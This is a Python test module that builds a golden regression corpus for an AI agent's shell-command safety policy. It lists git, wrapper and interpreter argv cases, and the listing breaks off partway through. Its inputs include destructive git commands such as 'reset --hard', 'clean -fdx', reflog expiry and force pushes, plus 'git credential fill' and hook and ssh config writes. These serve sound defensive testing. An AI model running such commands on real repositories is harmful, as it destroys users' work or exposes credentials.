"""Golden shell-policy corpus for ``_shell_command_policy`` (v0.5.5 stage 3.1).

The corpus is the differential evidence for the W3a/W3b decomposition of
``chartreux/core/tools/builtins/_shell_command_policy.py``: it records, against
the pre-split module, the exact observable behavior of every public entry point
the split moves. Stage 3.1 records it as the FIRST commit on the stage branch;
every later split commit must keep the replay green.

Layout:

- ``shell_policy_corpus/corpus.jsonl`` — one JSON object per line: ``id``,
  ``family``, the call inputs (``argv``, ``cwd``, ...), and ``expect`` (the
  recorded observations). Every observed call is recorded as either
  ``{"value": ...}`` or ``{"exception": {"type", "message"}}``.
- ``shell_policy_corpus/fixtures/`` — the deterministic repository fixture
  tree the I/O entries are recorded against. Git cannot track paths under a
  ``.git`` component, so the committed tree names every ``.git`` entry
  ``git-dir``; :func:`materialize_fixtures` copies the tree to a temp dir and
  renames each ``git-dir`` to ``.git`` before any observation runs.

Families (see :data:`OBSERVERS` for the exact recipe of each):

- ``policy`` — full ``ShellCommandPolicy`` asdict of ``analyze_shell_command_policy``.
- ``paths`` — ``path_candidates`` order (with and without ``inspect_executable``).
- ``git_pure`` — ``canonical_git_command``, ``is_dangerous_git_subcommand``,
  ``git_work_tree_writing_subcommand``, and the full
  ``DangerousCommandClassification`` asdict of ``classify_dangerous_git_command``.
- ``executor`` — ``executor_boundary`` asdict (or exception) per admission mode.
- ``executor_aux`` — ``executor_owned_tokens``, ``is_package_command``,
  ``package_argument_indexes``, ``inline_interpreter_switch``.
- ``argv_helpers`` — ``_command_name``, ``_options_before_double_dash``,
  ``matches_command_prefix`` (the W3a argv normalization surface).
- ``registry`` — the full ``EXECUTOR_REGISTRY`` key list and every grammar asdict.
- ``git_inspection`` — scope resolution, metadata/config discovery, configured
  remotes, work-tree resolution, cwd relocations, and config/hook risk, recorded
  against the materialized fixture tree with paths relative to its root.
- ``push_risk`` — ``git_push_destination_risk`` for literal modeled push calls.
- ``divergence`` — the deliberate divergences pinned end to end: dangling
  ``git -C``/``--git-dir``/``--work-tree``/``-c`` (runtime walker tolerates,
  classifier hard-denies) and ``GIT``-cased executables (canonical form
  case-sensitive, classifier casefolded).
- ``permission`` family: resolved permission classes through
  ``Bash.resolve_permission`` for wrapper payload commands and the shipped
  denylist: the sg -c acceptance pins (hard guard, ask class, run class),
  the fail-closed unmodeled sg forms, the probed egress clients and watch
  repeater denied by the shipped denylist (v0.5.9 P1-e2), and the
  wrapper-class audit closure (v0.5.9 P1-e3): one row per audited
  payload-runner and egress-client entry — transparent wrappers verified
  to re-analyze payloads, fail-closed modeled refusals, denylisted
  payload runners and egress clients, and git-protocol run-class rows.
  The v0.5.9 P2-a rows pin the destination-aware egress rule for the
  modeled network clients: literal loopback destinations (localhost,
  127.0.0.0/8, ::1) resolve run-class, the three destination-changing
  behavior classes resolve ask-class with a literal loopback input, and
  non-loopback or unparseable destinations resolve ask-class
  (network.egress), including through modeled wrappers. The v0.5.9 P2-c
  rows pin the recursive-`rm` operand analysis against real git-state
  fixtures built by :func:`build_recursive_rm_fixtures`: paired
  clean/unsaved fixtures asserting run versus handoff per the
  saved/unsaved split, with metadata-excluding, recovery-established
  positives and handoff rows for `.git`-overlap (encompassing and interior
  subpath), linked-worktree common directories, rebase-in-progress,
  outside-repository and mixed operands, and a nested repository with
  unestablished recovery. The v0.5.9 P2-d rows pin the `sudo -u`
  transparent wrapper (run-class and ask-class payloads re-analyzed,
  fail-closed unmodeled sudo forms) and the `git symbolic-ref` mode
  modeling (read-mode rows across the policy, paths, and git_pure
  families; write-mode and unmodeled forms denied). The v0.5.9 P3-a rows
  pin the benign audit dispositions (run-class `VIRTUAL_ENV` assignment
  prefixes and argument-carrying workspace-venv interpreter invocations;
  the retained bare-interpreter, absolute-redirection, and
  workspace-roots gates) and the hidden forms denied fail-closed
  (command substitution, heredoc-fed `sh`, the double-quoted `sg`
  payload resolving to the git.push ask-class proposal). The v0.5.9
  P3-b rows are the git-class recognition matrix: each adversarial
  payload class (ask-class push, hard-guard reset --hard and clean -fd)
  probed across quoting, -C relocation, pipes, command lists, and
  modeled-wrapper spellings. The v0.5.9 P3-c rows are the recursive-`rm`
  form-composition matrix: the P2-c paired fixtures and metadata rows
  probed across quoting, pipes, command lists, and modeled wrappers,
  plus the fail-closed no-repository and corrupt-`.git` fixtures.

Set-derived outputs are recorded sorted (their iteration order is hash-seed
dependent), and absolute fixture paths are recorded relative to the fixture
root (``<FIXTURES>`` in message text) so the corpus is machine-independent.

Regenerate after an intentional behavior change (never to mask a regression):

    uv run python tests/tools/test_shell_policy_corpus.py --record

Check-only (what CI runs via the round-trip test):

    uv run python tests/tools/test_shell_policy_corpus.py
"""

from __future__ import annotations

import argparse
from collections.abc import Callable
import dataclasses
import json
import os
from pathlib import Path
import shlex
import shutil
import subprocess
import sys
import tempfile
from typing import Any

import pytest

from chartreux.core.dangerous_commands import GitRepositoryRelocation, ModeledGitCall
from chartreux.core.tools.base import BaseToolState
from chartreux.core.tools.builtins import (
    _shell_argv,
    _shell_command_policy as policy,
    _shell_executor_grammar,
    _shell_git_classifier,
    _shell_git_inspection,
    _shell_git_policy,
    _shell_git_support,
)
from chartreux.core.tools.builtins.bash import Bash, BashArgs, BashToolConfig

CORPUS_DIR = Path(__file__).resolve().parent / "shell_policy_corpus"
CORPUS_PATH = CORPUS_DIR / "corpus.jsonl"
FIXTURES_SOURCE = CORPUS_DIR / "fixtures"
GIT_MARKER = ".git"
PLACEHOLDER = "git-dir"
FIXTURES_TOKEN = "<FIXTURES>"

# ---------------------------------------------------------------------------
# Corpus argv matrices
# ---------------------------------------------------------------------------

GIT_ARGV: list[list[str]] = [
    # Degenerate and bare invocations.
    [],
    ["git"],
    ["git", "-h"],
    ["git", "-v"],
    ["git", "--version"],
    ["git", "version"],
    ["git", "help"],
    # Executable-token normalization.
    ["GIT", "log"],
    ["Git", "status"],
    ["/usr/bin/git", "log"],
    ["/usr/bin/git", "push", "origin", "main"],
    ["git.exe", "log"],
    ["GIT", "push", "origin", "main"],
    # Global-option walk.
    ["git", "-C", "dir", "log"],
    ["git", "-Cdir", "log"],
    ["git", "-C", "a", "-C", "b", "log"],
    ["git", "--git-dir", "g", "log"],
    ["git", "--git-dir=g", "log"],
    ["git", "--work-tree", "w", "log"],
    ["git", "--work-tree=w", "log"],
    ["git", "--git-dir", "g", "--work-tree", "w", "log"],
    ["git", "-c", "k=v", "log"],
    ["git", "-c", "k=v", "-c", "j=w", "log"],
    ["git", "--config-env", "x", "log"],
    ["git", "--exec-path", "p", "log"],
    ["git", "--exec-path=p", "log"],
    ["git", "-p", "log"],
    ["git", "-P", "log"],
    ["git", "--paginate", "log"],
    ["git", "--no-pager", "log"],
    ["git", "--bare", "log"],
    ["git", "--", "log"],
    ["git", "-C", "dir"],
    ["git", "--", "-C", "log"],
    # Dangling and unknown globals.
    ["git", "-C"],
    ["git", "--git-dir"],
    ["git", "--work-tree"],
    ["git", "-c"],
    ["git", "--exec-path"],
    ["git", "--no-such", "log"],
    ["git", "-Q", "log"],
    # Readers.
    ["git", "log"],
    ["git", "log", "--oneline"],
    ["git", "log", "-p"],
    ["git", "status"],
    ["git", "status", "--short"],
    ["git", "diff"],
    ["git", "diff", "HEAD"],
    ["git", "show"],
    ["git", "show", "HEAD:file"],
    ["git", "blame", "f"],
    ["git", "grep", "pat"],
    ["git", "grep", "-r", "pat", "HEAD"],
    ["git", "ls-files"],
    ["git", "branch"],
    ["git", "branch", "-a"],
    ["git", "tag"],
    ["git", "rev-parse", "HEAD"],
    ["git", "rev-list", "HEAD"],
    ["git", "describe"],
    ["git", "cat-file", "-p", "HEAD"],
    ["git", "diff-tree", "HEAD"],
    ["git", "ls-tree", "HEAD"],
    ["git", "merge-base", "a", "b"],
    ["git", "name-rev", "HEAD"],
    ["git", "shortlog"],
    ["git", "show-ref"],
    ["git", "verify-pack", "p"],
    ["git", "whatchanged"],
    ["git", "for-each-ref"],
    ["git", "column"],
    ["git", "count-objects"],
    ["git", "check-attr", "x", "f"],
    ["git", "check-ignore", "f"],
    ["git", "check-mailmap", "a@b"],
    ["git", "check-ref-format", "refs/heads/x"],
    ["git", "diff-files"],
    ["git", "diff-index", "HEAD"],
    ["git", "get-tar-commit-id"],
    ["git", "reflog"],
    ["git", "stash"],
    ["git", "var", "GIT_AUTHOR_IDENT"],
    # push.
    ["git", "push"],
    ["git", "push", "origin"],
    ["git", "push", "origin", "main"],
    ["git", "push", "--force", "origin", "main"],
    ["git", "push", "--force-with-lease", "origin", "main"],
    ["git", "push", "--delete", "origin", "main"],
    ["git", "push", "--mirror", "origin"],
    ["git", "push", "--all", "origin"],
    ["git", "push", "--tags", "origin"],
    ["git", "push", "--follow-tags", "origin"],
    ["git", "push", "-f", "origin", "main"],
    ["git", "push", "-f", "-f", "origin", "main"],
    ["git", "push", "--repo", "https://x/y", "main"],
    ["git", "push", "--repo=https://x/y", "main"],
    ["git", "push", "--receive-pack", "prog", "origin"],
    ["git", "push", "--exec", "prog", "origin"],
    ["git", "push", "-u", "origin"],
    ["git", "push", "--push-option", "k=v", "origin"],
    ["git", "push", "https://example.com/r.git", "main"],
    ["git", "push", "/tmp/dest", "main"],
    ["git", "push", "origin", "main:refs/heads/x"],
    ["git", "push", "origin", ":refs/heads/x"],
    ["git", "push", "origin", "HEAD"],
    ["git", "push", "origin", "refs/heads/main"],
    ["git", "push", "origin", "+refs/heads/main"],
    ["git", "push", "origin", "main", "extra"],
    ["git", "push", "--", "origin"],
    ["git", "push", "--dry-run", "origin"],
    ["git", "push", "--atomic", "origin"],
    ["git", "push", "--no-verify", "origin"],
    ["git", "push", "-n", "origin"],
    ["git", "push", "-q", "origin"],
    ["git", "push", "-v", "origin"],
    # checkout / switch / restore.
    ["git", "checkout"],
    ["git", "checkout", "main"],
    ["git", "checkout", "-b", "new"],
    ["git", "checkout", "-B", "new"],
    ["git", "checkout", "--orphan", "x"],
    ["git", "checkout", "-f", "main"],
    ["git", "checkout", "--force", "main"],
    ["git", "checkout", "--", "path"],
    ["git", "checkout", "main", "--", "path"],
    ["git", "checkout", "--conflict", "merge", "--", "f"],
    ["git", "checkout", "--pathspec-from-file", "f"],
    ["git", "checkout", "--recurse-submodules", "main"],
    ["git", "checkout", "-p", "main"],
    ["git", "switch", "main"],
    ["git", "switch", "-c", "new"],
    ["git", "switch", "-C", "new"],
    ["git", "switch", "--discard-changes", "main"],
    ["git", "switch", "--orphan", "x"],
    ["git", "switch", "-f", "main"],
    ["git", "switch", "--recurse-submodules", "main"],
    ["git", "switch", "--", "path"],
    ["git", "restore", "f"],
    ["git", "restore", "--source", "HEAD", "f"],
    ["git", "restore", "-s", "HEAD", "--", "f"],
    ["git", "restore", "--staged", "f"],
    ["git", "restore", "--pathspec-from-file", "f"],
    ["git", "restore", "--worktree", "f"],
    # stash.
    ["git", "stash", "push"],
    ["git", "stash", "push", "-m", "msg"],
    ["git", "stash", "-m", "msg", "push"],
    ["git", "stash", "pop"],
    ["git", "stash", "apply"],
    ["git", "stash", "drop"],
    ["git", "stash", "clear"],
    ["git", "stash", "list"],
    ["git", "stash", "show"],
    ["git", "stash", "branch", "x"],
    ["git", "stash", "--pathspec-from-file", "f"],
    ["git", "stash", "push", "-u"],
    # reflog.
    ["git", "reflog", "show"],
    ["git", "reflog", "expire", "--expire", "now", "HEAD"],
    ["git", "reflog", "delete", "HEAD@{0}"],
    ["git", "reflog", "expire", "--expire-unreachable", "now", "--all"],
    # reset.
    ["git", "reset"],
    ["git", "reset", "--hard"],
    ["git", "reset", "--soft", "HEAD"],
    ["git", "reset", "--mixed"],
    ["git", "reset", "--keep", "HEAD"],
    ["git", "reset", "--merge", "HEAD"],
    ["git", "reset", "-q", "HEAD"],
    ["git", "reset", "--pathspec-from-file", "f"],
    ["git", "reset", "--", "f"],
    ["git", "reset", "--ha"],
    ["git", "reset", "--hard", "HEAD", "--", "f"],
    ["git", "reset", "HEAD", "--", "f"],
    # clean.
    ["git", "clean", "-f"],
    ["git", "clean", "-fd"],
    ["git", "clean", "-fdx"],
    ["git", "clean", "-n"],
    ["git", "clean", "-f", "-f"],
    ["git", "clean", "-i"],
    ["git", "clean", "-q"],
    ["git", "clean", "-e", "pat", "-fd"],
    ["git", "clean", "--exclude", "pat", "-fd"],
    ["git", "clean", "-X", "dir"],
    ["git", "clean", "-x", "-d"],
    # config.
    ["git", "config", "user.name"],
    ["git", "config", "--get", "user.name"],
    ["git", "config", "--get-all", "x"],
    ["git", "config", "--list"],
    ["git", "config", "-l"],
    ["git", "config", "user.name", "v"],
    ["git", "config", "--add", "remote.origin.push", "refs/heads/*"],
    ["git", "config", "remote.origin.push", "refs/heads/*"],
    ["git", "config", "url.https://x.insteadof", "y"],
    ["git", "config", "branch.main.remote", "origin"],
    ["git", "config", "branch.main.pushremote", "origin"],
    ["git", "config", "remote.origin.mirror", "true"],
    ["git", "config", "core.hookspath", "hooks"],
    ["git", "config", "core.editor", "vim"],
    ["git", "config", "core.sshcommand", "ssh"],
    ["git", "config", "core.askpass", "prog"],
    ["git", "config", "core.gitproxy", "proxy"],
    ["git", "config", "sequence.editor", "vim"],
    ["git", "config", "filter.x.clean", "prog"],
    ["git", "config", "filter.x.process", "prog"],
    ["git", "config", "merge.x.driver", "prog"],
    ["git", "config", "diff.x.command", "prog"],
    ["git", "config", "diff.x.textconv", "prog"],
    ["git", "config", "diff.x.external", "prog"],
    ["git", "config", "man.x.path", "prog"],
    ["git", "config", "man.x.viewer", "less"],
    ["git", "config", "interactive.difffilter", "prog"],
    ["git", "config", "include.path", "f"],
    ["git", "config", "includeif.gitdir:/x.path", "f"],
    ["git", "config", "includeif.onbranch:x.path", "f"],
    ["git", "config", "--unset", "user.name"],
    ["git", "config", "--unset-all", "x"],
    ["git", "config", "--rename-section", "core", "core2"],
    ["git", "config", "--remove-section", "core"],
    ["git", "config", "--rename-section", "filter.x", "core"],
    ["git", "config", "--file", "f", "user.name", "v"],
    ["git", "config", "-f", "f", "user.name", "v"],
    ["git", "config", "--blob", "b", "x", "v"],
    ["git", "config", "set", "user.name", "v"],
    ["git", "config", "get", "user.name"],
    ["git", "config", "edit"],
    ["git", "config", "--type", "int", "x"],
    ["git", "config", "--default", "v", "x"],
    ["git", "config", "--comment", "c", "x", "v"],
    ["git", "config", "-e"],
    ["git", "config", "-z"],
    ["git", "config", "--null", "x"],
    ["git", "config", "--show-origin", "x"],
    # remote.
    ["git", "remote"],
    ["git", "remote", "-v"],
    ["git", "remote", "add", "origin", "url"],
    ["git", "remote", "set-url", "origin", "url"],
    ["git", "remote", "rename", "a", "b"],
    ["git", "remote", "remove", "origin"],
    ["git", "remote", "rm", "origin"],
    ["git", "remote", "prune", "origin"],
    ["git", "remote", "update", "origin"],
    ["git", "remote", "show", "origin"],
    ["git", "remote", "get-url", "origin"],
    # worktree / submodule.
    ["git", "worktree", "list"],
    ["git", "worktree", "add", "path"],
    ["git", "worktree", "add", "-b", "br", "path"],
    ["git", "worktree", "add", "--reason", "r", "path"],
    ["git", "worktree", "add", "--detach", "path"],
    ["git", "worktree", "move", "old", "new"],
    ["git", "worktree", "move", "-f", "old", "new"],
    ["git", "worktree", "remove", "path"],
    ["git", "worktree", "prune"],
    ["git", "worktree", "repair"],
    ["git", "submodule", "add", "url", "path"],
    [
        "git",
        "submodule",
        "add",
        "-b",
        "br",
        "--reference",
        "r",
        "--separate-git-dir",
        "d",
        "url",
        "path",
    ],
    ["git", "submodule", "status"],
    ["git", "submodule", "update", "--init"],
    # archive / apply / init.
    ["git", "archive", "HEAD"],
    ["git", "archive", "--output", "a.tar", "HEAD"],
    ["git", "archive", "-o", "a.tar", "HEAD"],
    ["git", "archive", "--output=a.tar", "HEAD"],
    ["git", "apply", "p.diff"],
    ["git", "apply", "--directory", "d", "p.diff"],
    ["git", "apply", "--unsafe-paths", "p.diff"],
    ["git", "apply", "--3way", "p.diff"],
    ["git", "init"],
    ["git", "init", "dir"],
    ["git", "init", "--bare", "dir"],
    ["git", "init", "--initial-branch", "main", "dir"],
    ["git", "init", "--separate-git-dir", "g", "dir"],
    ["git", "init", "--shared", "dir"],
    ["git", "init", "--shared=group", "dir"],
    # Other non-readers.
    ["git", "add", "f"],
    ["git", "add", "-p", "f"],
    ["git", "add", "-A"],
    ["git", "commit", "-m", "x"],
    ["git", "commit", "--amend"],
    ["git", "rm", "f"],
    ["git", "rm", "-r", "d"],
    ["git", "rm", "--cached", "f"],
    ["git", "mv", "a", "b"],
    ["git", "clone", "url"],
    ["git", "clone", "--bare", "url"],
    ["git", "clone", "-b", "br", "url"],
    ["git", "fetch", "origin"],
    ["git", "fetch", "--all"],
    ["git", "pull"],
    ["git", "pull", "origin", "main"],
    ["git", "merge", "branch"],
    ["git", "cherry-pick", "abc"],
    ["git", "revert", "abc"],
    ["git", "rebase", "main"],
    ["git", "am", "--abort"],
    ["git", "bisect", "start"],
    ["git", "bisect", "reset"],
    ["git", "notes", "add", "-m", "x"],
    ["git", "help", "log"],
    # Unmodeled builtins and unrecognized subcommands.
    ["git", "gc"],
    ["git", "fsck", "--lost-found"],
    ["git", "bundle", "create", "b"],
    ["git", "daemon"],
    ["git", "filter-branch"],
    ["git", "update-ref", "refs/heads/x", "abc"],
    ["git", "receive-pack", "d"],
    ["git", "upload-pack", "d"],
    ["git", "credential", "fill"],
    ["git", "nosuchcmd"],
    ["git", "log", "--no-such-option"],
    ["git", "status", "--no-such"],
]

EXECUTOR_ARGV: list[list[str]] = [
    # uv.
    ["uv", "run", "cmd"],
    ["uv", "run", "cmd", "arg"],
    ["uv", "run", "--directory", "d", "cmd"],
    ["uv", "run", "--directory=d", "cmd"],
    ["uv", "run", "--project", "p", "cmd"],
    ["uv", "run", "--with", "pkg", "cmd"],
    ["uv", "run", "--with-editable", "./e", "cmd"],
    ["uv", "run", "--with-requirements", "r.txt", "cmd"],
    ["uv", "run", "--no-sync", "cmd"],
    ["uv", "run", "-q", "-v", "cmd"],
    ["uv", "run", "-p", "3.12", "cmd"],
    ["uv", "run", "--python", "3.12", "cmd"],
    ["uv", "pip", "install", "pkg"],
    ["uv", "pip", "install", "-r", "req.txt"],
    ["uv", "pip", "install", "./local"],
    ["uv", "pip", "install", "--python", "3.12", "pkg"],
    ["uv", "pip", "list"],
    ["uv", "--version"],
    ["uv", "run", "--no-such", "cmd"],
    ["uv", "run", "--project"],
    ["uv", "run", "--project="],
    ["uv", "run"],
    ["uv", "run", "--", "cmd"],
    # npx.
    ["npx", "pkg"],
    ["npx", "pkg", "arg"],
    ["npx", "-p", "pkg", "cmd"],
    ["npx", "-p", "a", "-p", "b", "cmd"],
    ["npx", "--yes", "pkg"],
    ["npx", "--no", "pkg"],
    ["npx", "--no-install", "pkg"],
    ["npx", "--quiet", "pkg"],
    ["npx", "--package", "a", "cmd"],
    ["npx", "-y", "-n", "pkg"],
    ["npx", "--registry", "r", "pkg"],
    ["npx"],
    # pipx.
    ["pipx", "run", "pkg"],
    ["pipx", "run", "--spec", "s", "pkg"],
    ["pipx", "run", "--python", "3.12", "pkg"],
    ["pipx", "run", "pkg", "arg"],
    ["pipx", "install", "pkg"],
    ["pipx", "run", "--verbose", "pkg"],
    ["pipx"],
    # go.
    ["go", "run", "main.go"],
    ["go", "run", "main.go", "arg"],
    ["go", "run", "./pkg"],
    ["go", "run", "-race", "main.go"],
    ["go", "run", "--tags", "t", "main.go"],
    ["go", "run", "-C", "d", "main.go"],
    ["go", "-C", "d", "run", "main.go"],
    ["go", "-C", "d", "run", "main.go", "arg"],
    ["go", "run", "--mod", "m", "main.go"],
    ["go", "build", "./..."],
    ["go", "run"],
    ["go", "run", "--bogus", "main.go"],
    ["go", "run", "--", "main.go"],
    ["go", "-C", "d"],
    # cargo.
    ["cargo", "run"],
    ["cargo", "run", "--manifest-path", "C.toml"],
    ["cargo", "run", "--manifest-path=C.toml"],
    ["cargo", "run", "--bin", "b"],
    ["cargo", "run", "--example", "e"],
    ["cargo", "run", "--package", "p"],
    ["cargo", "run", "-p", "p"],
    ["cargo", "run", "--release", "--", "--x"],
    ["cargo", "run", "--quiet", "--verbose", "--", "a"],
    ["cargo", "run", "--target", "t", "--", "a"],
    ["cargo", "run", "--", "arg"],
    ["cargo", "run", "arg"],
    ["cargo", "build"],
    ["cargo", "run", "--config", "k=v", "--", "a"],
    ["cargo", "run", "--target-dir", "d", "--", "a"],
    ["cargo", "run", "-j", "4", "--", "a"],
    ["cargo", "run", "-F", "f", "--", "a"],
    # script.
    ["script", "out.log", "cmd"],
    ["script", "out.log", "cmd", "arg"],
    ["script", "-c", "cmd", "out"],
    ["script", "-c", "cmd"],
    ["script", "cmd"],
    ["script"],
    # env.
    ["env", "cmd"],
    ["env", "FOO=1", "cmd"],
    ["env", "FOO=1", "BAR=2", "cmd", "arg"],
    ["env", "-i", "cmd"],
    ["env", "-i", "FOO=1", "cmd"],
    ["env", "--ignore-environment", "cmd"],
    ["env", "-u", "F", "cmd"],
    ["env", "--unset", "F", "cmd"],
    ["env", "-C", "d", "cmd"],
    ["env", "--chdir", "d", "cmd"],
    ["env", "-C", "d", "-C", "e", "cmd"],
    ["env", "-C", "d", "FOO=1", "cmd"],
    ["env", "-", "cmd"],
    ["env", "FOO", "cmd"],
    ["env", "FOO=1"],
    ["env"],
    ["env", "-x", "cmd"],
    # eval / command / builtin / exec.
    ["eval", "echo", "hi"],
    ["eval", "echo hi"],
    ["eval", ""],
    ["eval"],
    ["command", "-v", "python"],
    ["command", "-V", "python"],
    ["command", "python", "-c", "x"],
    ["command", "-p", "python"],
    ["command", "python"],
    ["command"],
    ["builtin", "cd", "d"],
    ["builtin", "echo", "hi"],
    ["builtin"],
    ["exec", "python", "-c", "x"],
    ["exec", "-a", "nm", "cmd"],
    ["exec", "-c", "cmd"],
    ["exec", "-l", "cmd"],
    ["exec", "-cl", "cmd"],
    ["exec", "cmd"],
    ["exec"],
    # busybox / toybox.
    ["busybox", "sh", "-c", "x"],
    ["busybox", "ash", "-c", "x"],
    ["busybox", "bash", "-c", "x"],
    ["busybox", "dash", "-c", "x"],
    ["busybox", "hush", "-c", "x"],
    ["busybox", "ls", "-l"],
    ["busybox", "cp", "a", "b"],
    ["busybox"],
    ["toybox", "sh", "-c", "x"],
    ["toybox", "ash", "-c", "x"],
    ["toybox", "cp", "a", "b"],
    ["toybox", "ls"],
    ["toybox"],
    # timeout / nice / stdbuf.
    ["timeout", "10", "cmd"],
    ["timeout", "10", "cmd", "arg"],
    ["timeout", "--signal", "KILL", "10", "cmd"],
    ["timeout", "--signal=KILL", "10", "cmd"],
    ["timeout", "-s", "KILL", "10", "cmd"],
    ["timeout", "-k", "5", "10", "cmd"],
    ["timeout", "--kill-after", "5", "10", "cmd"],
    ["timeout", "--foreground", "10", "cmd"],
    ["timeout", "--preserve-status", "10", "cmd"],
    ["timeout", "--verbose", "10", "cmd"],
    ["timeout", "-v", "10", "cmd"],
    ["timeout", "cmd"],
    ["timeout", "10"],
    ["timeout"],
    ["nice", "-n", "5", "cmd"],
    ["nice", "--adjustment", "5", "cmd"],
    ["nice", "-n5", "cmd"],
    ["nice", "-5", "cmd"],
    ["nice", "cmd"],
    ["nice"],
    ["stdbuf", "-o", "0", "cmd"],
    ["stdbuf", "-o0", "cmd"],
    ["stdbuf", "-i", "0", "-o", "0", "-e", "0", "cmd"],
    ["stdbuf", "-i0", "-o0", "-e0", "cmd"],
    ["stdbuf", "cmd"],
    ["stdbuf"],
    # flock / setsid / nohup.
    ["flock", "lock", "cmd"],
    ["flock", "-x", "lock", "cmd"],
    ["flock", "-s", "lock", "cmd"],
    ["flock", "--shared", "lock", "cmd"],
    ["flock", "--exclusive", "lock", "cmd"],
    ["flock", "--wait", "5", "lock", "cmd"],
    ["flock", "-w", "5", "lock", "cmd"],
    ["flock", "--conflict-exit-code", "1", "lock", "cmd"],
    ["flock", "-E", "1", "lock", "cmd"],
    ["flock", "lock", "cmd", "arg"],
    ["flock", "lock"],
    ["flock"],
    ["setsid", "cmd"],
    ["setsid", "--fork", "cmd"],
    ["setsid", "--ctty", "cmd"],
    ["setsid", "--wait", "cmd"],
    ["setsid", "-c", "cmd"],
    ["setsid", "-f", "cmd"],
    ["setsid", "-w", "cmd"],
    ["setsid"],
    ["nohup", "cmd"],
    ["nohup", "cmd", "arg"],
    ["nohup"],
    # ionice / taskset / time.
    ["ionice", "-c", "2", "cmd"],
    ["ionice", "-n", "5", "cmd"],
    ["ionice", "-p", "1", "cmd"],
    ["ionice", "-P", "1"],
    ["ionice", "--class", "2", "cmd"],
    ["ionice", "--classdata", "x", "cmd"],
    ["ionice", "--ignore", "cmd"],
    ["ionice", "cmd"],
    ["ionice"],
    ["taskset", "-c", "0", "cmd"],
    ["taskset", "--cpu-list", "0", "cmd"],
    ["taskset", "-a", "cmd"],
    ["taskset", "cmd"],
    ["taskset", "0x1", "cmd"],
    ["taskset"],
    ["time", "cmd"],
    ["time", "-f", "fmt", "cmd"],
    ["time", "--format", "fmt", "cmd"],
    ["time", "-o", "f", "cmd"],
    ["time", "--output", "f", "cmd"],
    ["time", "-a", "-o", "f", "cmd"],
    ["time", "-p", "cmd"],
    ["time", "-v", "cmd"],
    ["time", "-q", "cmd"],
    ["time"],
    # Shells.
    ["bash", "-c", "echo hi"],
    ["bash", "-c", "echo hi", "arg0"],
    ["sh", "-c", "echo hi"],
    ["bash", "-lc", "x"],
    ["bash", "-l", "-c", "x"],
    ["bash", "--rcfile", "f", "-i"],
    ["bash", "--init-file", "f"],
    ["bash", "-i"],
    ["bash", "-s"],
    ["bash", "-r"],
    ["bash", "+o", "history"],
    ["bash", "+O", "vi"],
    ["bash", "-c"],
    ["bash", "--", "-c", "x"],
    ["bash", "script.sh"],
    ["bash"],
    ["sh", "-c", "x", "name"],
    ["zsh", "-c", "x"],
    ["ksh", "-c", "x"],
    ["dash", "-c", "x"],
    ["ash", "-c", "x"],
    ["hush", "-c", "x"],
    # Python family: inline switches and the module-executor path.
    ["python", "-c", "print(1)"],
    ["python", "-c", "print(1)", "arg"],
    ["python", "-c"],
    ["python", "-B", "-c", "x"],
    ["python", "-E", "-S", "-c", "x"],
    ["python", "-I", "-c", "x"],
    ["python", "-u", "-c", "x"],
    ["python", "-q", "-c", "x"],
    ["python", "-v", "-c", "x"],
    ["python", "-W", "ignore", "-c", "x"],
    ["python", "-X", "utf8", "-c", "x"],
    ["python", "-d", "-c", "x"],
    ["python", "-O", "-c", "x"],
    ["python", "-OO", "-c", "x"],
    ["python", "-s", "-c", "x"],
    ["python", "-S", "-c", "x"],
    ["python", "-b", "-c", "x"],
    ["python", "-h"],
    ["python", "--check-hash-based-pycs", "always", "-c", "x"],
    ["python", "script.py"],
    ["python", "script.py", "arg"],
    ["python"],
    ["python", "-m", "http.server"],
    ["python", "-m", "http.server", "8080"],
    ["python", "-m", "pip", "install", "x"],
    ["python", "-m", "pip"],
    ["python", "-m", "uv"],
    ["python", "-m", "uv", "run", "cmd"],
    ["python", "-m", "unknown.mod"],
    ["python", "-m", "unknown.mod", "arg"],
    ["python", "-m", "a.b"],
    ["python", "-m", "123"],
    ["python", "-m", "-x"],
    ["python", "-m"],
    ["python3", "-c", "x"],
    ["python3", "-m", "venv", "v"],
    ["pypy", "-c", "x"],
    ["pypy3", "-m", "pip"],
    ["python", "-c", "x", "-m", "y"],
    ["python", "-m", "os", "-c", "x"],
    # node / perl / ruby.
    ["node", "-e", "code"],
    ["node", "--eval", "code"],
    ["node", "-p", "code"],
    ["node", "--print", "code"],
    ["node", "-r", "mod", "-e", "x"],
    ["node", "--require", "mod", "-e", "x"],
    ["node", "-i", "-e", "x"],
    ["node", "--input-type", "module", "-e", "x"],
    ["node", "--no-warnings", "-e", "x"],
    ["node", "script.js"],
    ["node", "-e"],
    ["node", "-e", "x", "-e", "y"],
    ["perl", "-e", "code"],
    ["perl", "-w", "-e", "x"],
    ["perl", "-n", "-e", "x"],
    ["perl", "-p", "-e", "x"],
    ["perl", "-l", "-e", "x"],
    ["perl", "-T", "-e", "x"],
    ["perl", "-M", "Mod", "-e", "x"],
    ["perl", "-I", "dir", "-e", "x"],
    ["perl", "-F", "pat", "-e", "x"],
    ["perl", "script.pl"],
    ["perl", "-e"],
    ["perl", "-e", "x", "-w"],
    ["ruby", "-e", "code"],
    ["ruby", "-w", "-e", "x"],
    ["ruby", "-n", "-e", "x"],
    ["ruby", "-p", "-e", "x"],
    ["ruby", "-d", "-e", "x"],
    ["ruby", "-v", "-e", "x"],
    ["ruby", "-I", "dir", "-e", "x"],
    ["ruby", "-C", "d", "-e", "x"],
    ["ruby", "-E", "UTF-8", "-e", "x"],
    ["ruby", "-F", "pat", "-e", "x"],
    ["ruby", "-K", "u", "-e", "x"],
    ["ruby", "-T", "-e", "x"],
    ["ruby", "-W", "-e", "x"],
    ["ruby", "-W0", "-e", "x"],
    ["ruby", "--disable", "gems", "-e", "x"],
    ["ruby", "--enable", "gems", "-e", "x"],
    ["ruby", "script.rb"],
    ["ruby", "-e"],
    ["ruby", "-e", "x", "-w"],
    # Nesting and depth.
    ["uv", "run", "python", "-c", "x"],
    ["env", "FOO=1", "uv", "run", "cmd"],
    ["bash", "-c", "uv run x"],
    ["timeout", "10", "npx", "pkg"],
    ["npx", "python", "-c", "x"],
    ["env", "A=1", "env", "B=2", "env", "C=3", "env", "D=4", "env", "E=5", "cmd"],
    [
        "env",
        "A=1",
        "env",
        "B=2",
        "env",
        "C=3",
        "env",
        "D=4",
        "env",
        "E=5",
        "env",
        "F=6",
        "env",
        "G=7",
        "env",
        "H=8",
        "env",
        "I=9",
        "cmd",
    ],
]

TOOL_ARGV: list[list[str]] = [
    # Listing / reading.
    ["ls", "-l", "dir"],
    ["echo", "hi"],
    ["cat", "f"],
